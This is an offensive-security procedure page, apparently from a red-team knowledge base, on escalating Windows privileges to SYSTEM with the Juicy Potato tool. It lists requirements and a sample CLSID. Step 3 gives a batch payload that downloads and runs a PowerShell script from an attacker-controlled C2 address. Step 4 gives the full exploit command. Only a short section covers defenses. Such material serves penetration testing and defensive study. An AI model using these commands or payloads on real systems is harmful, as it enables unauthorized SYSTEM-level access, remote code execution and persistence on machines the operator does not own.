---
id: 8c07e59c-c73d-4761-b7c1-63b78da4efec
name: Escalate-Privileges-Using-Juicy-Potato
type: procedure
verified: true
submitted: true
created_at: '2020-06-24T21:19:46.855167+00:00'
updated_at: '2023-05-25T19:53:33.352128+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access Token Manipulation|T1134 - Access Token Manipulation]]'
sub_techniques: []
tags:
  - privilege-escalation
  - windows-exploit
  - impersonation
  - juicy-potato
commands:
  - '[[commands/juicy-potato-execute-program]]'
platforms:
  - Windows
tools:
  - '[[tools/Juicy-Potato]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Escalate-Privileges-Using-Juicy-Potato

## Summary

This procedure exploits the Juicy Potato tool to escalate privileges from a low-privileged user to SYSTEM on vulnerable Windows systems by leveraging SeImpersonate or SeAssignPrimaryToken privileges. It allows execution of arbitrary commands as SYSTEM, enabling further post-exploitation activities like persistence or data exfiltration. Applicable to many Windows versions up to Server 2016 and older Windows 10 builds, but patched in Server 2019 and newer.

## Description

Juicy Potato abuses Windows COM (Component Object Model) interfaces to impersonate the SYSTEM token through a local RPC (Remote Procedure Call) service. By creating a specially crafted DCOM object with a known CLSID that runs under SYSTEM context, the tool hijacks the token and uses it to spawn a new process with elevated privileges. This technique bypasses standard privilege checks and is effective in environments where the user has impersonation rights, common in service accounts or after initial foothold. The procedure involves preparing the tool, selecting a suitable CLSID, crafting a payload script, and executing the exploit. Success grants a SYSTEM shell, but detection can occur via process creation monitoring or anomalous token usage.

## Requirements

1. Target must be Windows Server 2008-2016 or Windows 7-10 (pre-1809 builds); patched in newer versions.
2. Current user must have SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (check with [[commands/whoami-privileges]]).
3. JuicyPotato.exe binary available on the target or transferable via SMB/HTTP.
4. Write access to a directory for staging the payload script (e.g., C:\Windows\System32\spool\drivers\color).
5. Network access if downloading additional payloads (e.g., PowerShell scripts from attacker-controlled server).

## Defense

- Apply patches: Disable vulnerable CLSIDs via registry or update to Windows Server 2019+.
- Monitor for anomalous process creation: Use Sysmon or EDR to detect JuicyPotato.exe or suspicious DCOM/RPC activity (Event ID 5156 for token impersonation).
- Restrict SeImpersonate privileges: Limit to necessary services via Group Policy.
- Enable Protected Process Light (PPL) for critical processes and audit token manipulations.

## Objectives

1. Verify user privileges allow impersonation.
2. Execute arbitrary code as NT AUTHORITY\SYSTEM.
3. Establish a persistent elevated shell for further actions.

## Instructions

### Step 1: Prepare JuicyPotato Binary

**Context**: Obtain or build the JuicyPotato executable, as it may not be pre-built. Transfer it to the target system via an existing foothold (e.g., SMB share or initial shell).

Refer to [[tools/Juicy-Potato]] for installation and build details. Copy JuicyPotato.exe to a writable directory on the target, such as C:\temp\.

**Expected Output**: JuicyPotato.exe present and executable on the target.

### Step 2: Select CLSID for Impersonation

**Context**: Choose a CLSID from known vulnerable lists that runs as SYSTEM. This is critical for token hijacking; test multiple if the first fails.

Use a sample CLSID for wuauserv (Windows Update service):

Local Service | App ID | CLSID | User
---|---|---|---
wuauserv | {653C5148-4DCE-4905-9CFD-1B23662D3D9E} | {e60687f7-01a1-40aa-86ac-db1cbf673334} | NT AUTHORITY\SYSTEM

Store the CLSID (e.g., {e60687f7-01a1-40aa-86ac-db1cbf673334}) for use in the next step. Full lists available in the Juicy Potato GitHub repository.

**Expected Output**: Valid CLSID selected that impersonates SYSTEM.

### Step 3: Create Payload Script

**Context**: Prepare a batch file or script to execute as SYSTEM, such as downloading and running a PowerShell payload from an attacker server. This demonstrates post-escalation execution.

Create a file like shell.bat in a staging directory (e.g., C:\Windows\System32\spool\drivers\color\shell.bat) with the following content, referencing [[codes/Windows-Batch-Download-and-Execute-PowerShell]]:

```batch
@ECHO OFF
powershell.exe -ep bypass "iex(New-Object Net.WebClient).downloadString('http://$_ATTACKER_IP/shell.ps1')"
```

Replace $_ATTACKER_IP with your C2 server IP.

**Expected Output**: shell.bat created successfully.

### Step 4: Execute Privilege Escalation

**Context**: Run JuicyPotato with the payload path and CLSID to spawn the process as SYSTEM. The -l flag sets a local port for the RPC listener (arbitrary, e.g., 9999).

**Command** ([[commands/juicy-potato-execute-program]]):
```command_prompt
JuicyPotato.exe -l 9999 -p "C:\Windows\System32\spool\drivers\color\shell.bat" -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

The -t * option uses all available methods for token creation. Monitor for the payload execution (e.g., PowerShell download).

**Expected Output**: Output indicating successful authentication and process creation, followed by the payload running as SYSTEM.
